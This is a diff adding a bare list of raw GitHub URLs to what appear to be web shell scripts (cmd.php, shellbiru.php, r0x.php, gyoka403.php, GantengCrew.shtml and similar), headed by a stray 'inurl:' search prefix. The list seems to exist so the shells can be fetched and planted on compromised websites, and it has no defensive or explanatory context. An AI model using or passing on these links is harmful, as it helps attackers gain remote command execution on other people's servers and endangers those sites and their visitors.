@@ -1,0 +1,16 @@
+inurl: 
+https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/2.phtml
+https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/2.shtml
+https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/GantengCrew.shtml
+https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/Minfo.php
+https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/class-wp2.php
+https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/cmd.php
+https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/cmd2.php
+https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/gyoka403.php
+https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/gyokka2.php
+https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/handler.php
+https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/log-sec.php
+https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/r0x.php
+https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/red.php
+https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/shellbiru.php
+https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/ss.shtml
